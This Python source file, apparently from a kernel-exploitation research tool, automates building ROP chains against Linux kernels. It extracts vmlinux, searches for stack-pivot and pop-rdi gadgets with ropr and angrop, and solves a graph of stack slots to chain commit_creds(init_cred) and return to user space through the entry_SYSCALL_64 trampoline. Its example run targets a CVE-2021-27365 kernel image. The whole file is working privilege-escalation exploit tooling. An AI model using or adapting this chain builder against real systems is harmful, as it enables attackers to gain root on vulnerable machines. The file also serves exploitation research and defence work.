import os
import re
import tempfile
import subprocess
import networkx as nx
from collections import defaultdict
from multiprocessing import Pool, cpu_count

import angr
import tqdm
from elftools.elf.elffile import ELFFile
from angrop import rop_utils
from angrop.gadget_analyzer import GadgetAnalyzer

from log import new_logger

logger = new_logger("ChainBuilder")
angr.loggers.disable_root_logger()

UTIL_DIR = os.path.join(os.path.dirname(__file__), "utils")
EXTRACT = os.path.join(UTIL_DIR, "extract-vmlinux")

_global_gadget_analyzer = None

# global initializer for multiprocessing
def _set_global_gadget_analyzer(rop_gadget_analyzer):
    global _global_gadget_analyzer
    _global_gadget_analyzer = rop_gadget_analyzer

def run_worker(addr):
    return _global_gadget_analyzer.analyze_gadget(addr)

class Node:
    def __init__(self, offset):
        self.offset = offset

    def __repr__(self):
        return f"Node({self.offset})"

    def __eq__(self, n):
        return self.offset == n.offset

    def __hash__(self):
        return hash(self.offset)

class ChainBuilder:
    def __init__(self, kernel_path, sim_stack, symbols):
        self.kernel_path = kernel_path
        self.sim_stack = sim_stack
        self.vmlinux_path = None
        self.project = None
        self.ganalyzer = None
        self.pivot_gadget_map = None
        self.nordi_pivot_gadget_map = None
        self.rdi_gadgets = None
        self.ret_gadget = None
        self.symbols = symbols

        self.text_start = None
        self.text_end = None

    def analyze_gadgets(self, addrs):
        gadgets = []
        pool = Pool(processes=cpu_count(), initializer=_set_global_gadget_analyzer, initargs=(self.ganalyzer,))

        it = pool.imap_unordered(run_worker, addrs, chunksize=5)
        for gadget in tqdm.tqdm(iterable=it, total=len(addrs), smoothing=0, dynamic_ncols=True):
            if gadget is None:
                continue
            gadgets.append(gadget)
        pool.close()

        return gadgets

    def get_gadgets(self):
        """
        Analyze the kernel and distill all the gadgets that may potentially be helpful for the exploitation
        """
        logger.info("Initialize gadget finder...")

        start = self.text_start
        end = self.text_end

        logger.info("Looking for pivot gadgets...")
        output = subprocess.getoutput(f"ropr --range {start:#x}-{end:#x} -c false {self.vmlinux_path} 2>/dev/null")
        lines = output.splitlines()

        #### look for stack pivot gadget ####
        # 1. gadgets with 'add rsp'
        # 2. 'ret n' gadgets
        # filter out gadget using esp, it won't work
        lines = [x for x in lines if 'esp' not in x]
        # add rsp gadgets, it doesn't have to be the first inst because pop; add rsp exists
        # also, make sure it ends with ret, well, it doesn't have to, but it makes things much easier for me
        lines1 = [x for x in lines if 'add rsp' in x and 'ret' in x]
        # in practice, ret 0xnnnn gadgets are only meaningful when ret is the only inst
        # lines2 = [x for x in lines if ': ret 0x' in x]
        # filter out unaligned ret gadgets
        #pattern = re.compile(r"ret (0x[0-9a-f]+);")
        #lines2 = [x for x in lines2 if int(pattern.search(x).group(1), 16) % 8 == 0]
        # we hate memory acesses
        lines1 = [x for x in lines1 if 'add [r' not in x and 'mov [r' not in x]

        # now analyze all the gadgets using angrop
        addr_pattern = re.compile(r"^0xffffffff[0-9a-f]{8}")
        #addrs = [int(addr_pattern.search(x).group(0), 16) for x in lines1+lines2]
        addrs = [int(addr_pattern.search(x).group(0), 16) for x in lines1]
        gadgets = self.analyze_gadgets(addrs)
        # TODO: well, we hate memory accesses, so for now, we don't allow it. maybe we can allow it
        # in the future when we can track crashing registers
        pivot_gadgets = [x for x in gadgets if len(x.mem_changes)+len(x.mem_reads)+len(x.mem_writes) == 0 and x.bp_moves_to_sp is False]

        # now collect pivot gadgets
        d = defaultdict(list)
        d2 = defaultdict(list)
        for g in pivot_gadgets:
            d[g.stack_change].append(g)
            if 'rdi' not in g.changed_regs:
                d2[g.stack_change].append(g)
        self.pivot_gadget_map = {}
        for key in d:
            gadgets = d[key]
            if len(gadgets) == 1:
                self.pivot_gadget_map[key] = gadgets[0]
                continue
            best_gadget = sorted(gadgets, key=lambda x: x.block_length)[0]
            self.pivot_gadget_map[key] = best_gadget
        self.nordi_pivot_gadget_map = {}
        for key in d2:
            gadgets = d2[key]
            if len(gadgets) == 1:
                self.nordi_pivot_gadget_map[key] = gadgets[0]
                continue
            best_gadget = sorted(gadgets, key=lambda x: x.block_length)[0]
            self.nordi_pivot_gadget_map[key] = best_gadget

        #### look for pop rdi gadget ####
        lines1 = [x for x in lines if 'mov rdi' in x]
        lines2 = [x for x in lines if 'pop rdi' in x]
        addrs = [int(addr_pattern.search(x).group(0), 16) for x in lines1+lines2]
        gadgets = self.analyze_gadgets(addrs)
        self.rdi_gadgets = [x for x in gadgets if len(x.mem_changes)+len(x.mem_reads)+len(x.mem_writes) == 0 and
                                         'rdi' in x.popped_regs and x.bp_moves_to_sp is False]
        #### look for ret gadget ####
        lines1 = [x for x in lines if ': ret;' in x]
        addrs = [int(addr_pattern.search(x).group(0), 16) for x in lines1]
        assert len(addrs) > 0
        self.ret_gadget = self.ganalyzer.analyze_gadget(addrs[0])

        self.nordi_pivot_gadget_map[8] = self.ret_gadget
        self.pivot_gadget_map[8] = self.ret_gadget

    def analyze_rdi_gadgets(self):
        # first analyze the offset of pop rdi values on stack
        rdi_offsets = [0]*len(self.rdi_gadgets)
        for i in range(len(self.rdi_gadgets)):
            g = self.rdi_gadgets[i]
            init_state = self.ganalyzer._test_symbolic_state.copy()
            init_state.ip = g.addr
            final_state = rop_utils.step_to_unconstrained_successor(self.project, state=init_state)
            var_list = list(final_state.regs.rdi.variables)
            assert len(var_list) == 1 # should be aligned
            var = var_list[0]
            offset = int(re.search("symbolic_stack_(\d+)_", var).group(1))
            rdi_offsets[i] = offset

        # next, filter out duplicate pop rdi gadgets
        # we regard two gadgets as the same if they have the same stack_change and the rdi offset
        # on stack is the same
        d = defaultdict(list)
        for i in range(len(self.rdi_gadgets)):
            g = self.rdi_gadgets[i]
            d[(g.stack_change, rdi_offsets[i])].append(g)

        # pick the smallest gadget in duplicate gadgets
        self.rdi_gadgets = []
        for key in d:
            gadgets = d[key]
            if len(gadgets) == 1:
                self.rdi_gadgets.append((gadgets[0], key[1]))
                continue
            best_gadget = sorted(gadgets, key=lambda x: x.block_length)[0]
            self.rdi_gadgets.append((best_gadget, key[1]))

    def gen_matches(self):
        sim_stack = ["init"] + self.sim_stack
        for gadget, rdi_offset in self.rdi_gadgets:
            next_gadget_offset = gadget.stack_change//8
            for i in range(0, len(sim_stack)-next_gadget_offset):
                # make sure it is symbolic
                if sim_stack[i] == 0:
                    continue
                # make sure it can be chained
                if sim_stack[i+next_gadget_offset] == 0:
                    continue
                # make sure rdi is controllable
                if sim_stack[i+1+rdi_offset] == 0:
                    continue
                # make sure these three gadgets can be different
                tmp = set([sim_stack[i], sim_stack[i+next_gadget_offset], sim_stack[i+1+rdi_offset]])
                if len(tmp) == 3:
                    yield (gadget, rdi_offset, i)
        return

    def clear_var(self, stack, var):
        assert var in stack
        for i in range(len(stack)):
            if stack[i] == var:
                stack[i] = 0
        return stack

    def build_edges(self, graph, start_idx, end_idx, d, keep_rdi=True):
        gadget_map = self.nordi_pivot_gadget_map if keep_rdi else self.pivot_gadget_map
        for i in range(start_idx, end_idx):
            if i not in d:
                continue
            start_node = d[i]
            for j in range(i+1, end_idx+1):
                if j not in d:
                    continue
                end_node = d[j]
                diff = (j-i)*8

                if diff in gadget_map:
                    graph.add_edge(start_node, end_node)

    def build_graph(self, stack, prdi_start_idx, prdi_end_idx, commit_start_idx):
        commit_end_idx = commit_start_idx + 1
        graph = nx.DiGraph()

        d = {}

        init_node = Node(0)
        graph.add_node(init_node)
        d[0] = init_node
        if prdi_start_idx == 0:
            prdi_node = init_node
        else:
            prdi_node = Node(prdi_start_idx)
            graph.add_node(prdi_node)
            d[prdi_start_idx] = prdi_node

        # add commit_node
        commit_node = Node(commit_start_idx)
        graph.add_node(commit_node)
        d[commit_start_idx] = commit_node

        ret_node = Node(len(stack)-22)
        graph.add_node(ret_node)
        d[len(stack)-22] = ret_node

        # create a node for each symbolic value
        for i in range(len(stack)):
            if stack[i] != 0:
                node = Node(i)
                graph.add_node(node)
                d[i] = node

        # in case init node is not prdi node, we need to connect all possible nodes between them
        if prdi_start_idx != 0:
            self.build_edges(graph, 0, prdi_start_idx, d)

        if prdi_end_idx != commit_start_idx:
            # in case prdi node is not adjacent to commit node, we need to connect all possible nodes between them
            self.build_edges(graph, prdi_end_idx, commit_start_idx, d)
        else:
            # in case prdi node is adjacent to commit node, connect them
            graph.add_edge(prdi_node, d[commit_start_idx])

        # connect commit node and its next node
        graph.add_edge(commit_node, d[commit_end_idx])

        # connect all nodes after commit node
        self.build_edges(graph, commit_end_idx, len(stack)-1, d)

        return graph

    def _find_solve(self):
        sim_stack = ["init"] + self.sim_stack
        for gadget, rdi_offset, idx in list(self.gen_matches()):
            stack = sim_stack.copy()
            constraints = {}

            # set constraints for pop rdi gadgdet
            g_var = stack[idx]
            constraints[g_var] = gadget.addr
            stack = self.clear_var(stack, g_var)
            rdi_var = stack[idx+1+rdi_offset]
            constraints[rdi_var] = "init_cred"
            stack = self.clear_var(stack, rdi_var)

            # now search gadgets for the "commit_creds; ret" gadget
            indices = [x for x in range(idx+gadget.stack_change//8, len(stack)-1)
                                if stack[x] != 0 and stack[x+1] != 0 and stack[x] != stack[x+1]]
            if not indices:
                continue

            # set constraints for commit_creds
            for idx2 in indices:
                stack2 = stack.copy()
                constraints2 = constraints.copy()

                g_var = stack2[idx2]
                constraints2[g_var] = "commit_creds"
                stack2 = self.clear_var(stack2, g_var)

                prdi_start_idx = idx
                prdi_end_idx = idx + gadget.stack_change//8
                commit_start_idx = idx2
                graph = self.build_graph(stack2, prdi_start_idx, prdi_end_idx, commit_start_idx)
                finish_nodes = [Node(x) for x in range(len(stack2)-22, len(stack2)) if stack2[x] != 0]
                if idx2 < len(stack2) - 22:
                    finish_nodes += [Node(len(stack2)-22)]

                for n in finish_nodes:
                    if not nx.has_path(graph, Node(0), n):
                        continue
                    constraints3 = constraints2.copy()
                    path = nx.shortest_path(graph, source=Node(0), target=n) # pylint:disable=unexpected-keyword-arg,no-value-for-parameter
                    print(path)
                    for i in range(len(path)-1):
                        node = path[i]
                        symbol = stack2[node.offset]
                        if symbol == 0:
                            continue
                        if symbol in constraints3:
                            break
                        stack_change = (path[i+1].offset - path[i].offset)*8
                        if i < prdi_start_idx:
                            gadget_map = self.pivot_gadget_map
                        else:
                            gadget_map = self.nordi_pivot_gadget_map
                        assert stack_change in gadget_map
                        constraints3[symbol] = gadget_map[stack_change].addr
                    constraints3[stack2[n.offset]] = f"trampoline_{n.offset-len(stack2)}"

                    # before returning, we need to filter out the possible extra constraint introduced by Node(len(stack2)-22)
                    # which is the natural return gadget
                    constraints3 = {x:y for x, y in constraints3.items() if x != 0}
                    return constraints3
        return None

    def find_solve(self):
        # first, find the constraints on user data
        constraints = self._find_solve()
        if constraints is None:
            raise RuntimeError("Fail to construct ROP chain!")

        # resolve the symbols
        for key in constraints:
            if constraints[key] == "init_cred":
                constraints[key] = self.symbols["init_cred"][0]
            if constraints[key] == "commit_creds":
                constraints[key] = self.symbols["commit_creds"][0]

            if type(constraints[key]) == str and constraints[key].startswith("trampoline_"):
                res = re.search(f"trampoline_(.*)", constraints[key])
                assert res
                offset = int(res.group(1))
                print(offset)
                # grab the trampoline snippet
                start = self.symbols['entry_SYSCALL_64'][0]
                end = start + 0x200
                output = subprocess.getoutput(f"objdump -M intel -d --start-address={start:#x} --stop-address={end:#x} {self.vmlinux_path}")
                lines = output.splitlines()
                for i in range(0, len(lines)-2):
                    if "pop" not in lines[i] or "r15" not in lines[i]:
                        continue
                    if "pop" not in lines[i+1] or "r14" not in lines[i+1]:
                        continue
                    if "pop" not in lines[i+2] or "r13" not in lines[i+2]:
                        continue
                    idx = i
                    break
                else:
                    raise RuntimeError("Fail to find the trampoline snippet")
                # make sure the trampoline is in an expected form (pop only)
                assert "pop" in lines[idx+13] and "pop" not in lines[idx+14]
                snippet = lines[idx:idx+15]
                line = snippet[offset+7]
                addr = int(line.split('\t')[0].strip(':'), 16)
                constraints[key] = addr
        return constraints

    def __enter__(self):
        # extract vmlinux
        _, vmlinux_path = tempfile.mkstemp(prefix="retspill-")
        proc = subprocess.run(f"{EXTRACT} {self.kernel_path} > {vmlinux_path}", shell=True)
        assert proc.returncode == 0
        self.vmlinux_path = vmlinux_path

        self.project = angr.Project(self.vmlinux_path)
        self.ganalyzer = GadgetAnalyzer(self.project, True, stack_length=0x200) # be generous, just give it a whole page

        # extract the range of .text section
        with open(self.vmlinux_path, "rb") as f:
            elffile = ELFFile(f)
            text = elffile.get_section_by_name(".text")
            self.text_start = text.header['sh_addr']
            self.text_end = self.text_start + text.header['sh_size']
        return self

    def __exit__(self, exc_type, exc_value, exc_traceback):
        # cleanup
        os.unlink(self.vmlinux_path)

if __name__ == '__main__':
    import monkeyhex
    #sim_stack = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 'uninit_mem', 'uninit_mem', 0, 0, 'uninit_mem', 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 'uninit_mem', 'uninit_mem', 'uninit_mem', 'uninit_mem', 'uninit_mem', 'uninit_mem', 'uninit_mem', 'uninit_mem', 'uninit_mem', 'uninit_mem', 'uninit_mem', 'uninit_mem', 'uninit_mem', 'uninit_mem', 'uninit_mem', 0, 0, 'uninit_mem', 'uninit_mem', 'uninit_mem', 'uninit_mem', 'uninit_mem', 'uninit_mem', 'uninit_mem', 'uninit_mem', 'uninit_mem', 'uninit_mem', 'uninit_mem', 'uninit_mem', 'uninit_mem', 'uninit_mem', 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 'user_0x7ffcf7e08e30', 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 'reg_r15', 'reg_r14', 'reg_r13', 'reg_r12', 'reg_rbp', 'reg_rbx', 0, 'reg_r10', 'reg_r9', 'reg_r8', 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
    sim_stack = [0, 'uninit_mem', 'uninit_mem', 0, 0, 0, 0, 0, 0, 0, 0, 0, 'conv_rbp', 'conv_r12', 'conv_r13', 'conv_r14', 0, 0, 0, 0, 0, 0, 0, 0, 0, 'reg_r9', 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
    sim_stack = [0 if x == 'uninit_mem' else x for x in sim_stack]
    kernel_path = '<retspill>/exploit_env/CVEs/CVE-2021-27365/kernel/arch/x86/boot/bzImage'
    assert os.path.exists(kernel_path), f"{kernel_path} doesn't exist!"
    symbols = {"commit_creds": (0x41414141, 1), "init_cred": (0x42424242, 1), "entry_SYSCALL_64": (0xffffffff81e00000, 0x200)}
    with ChainBuilder(kernel_path, sim_stack, symbols) as builder:
        builder.get_gadgets()
        builder.analyze_rdi_gadgets()
        constraints = builder.find_solve()
        print(monkeyhex.maybe_hex(constraints))
    for i in range(len(sim_stack)):
        print(hex(i*8), sim_stack[i])
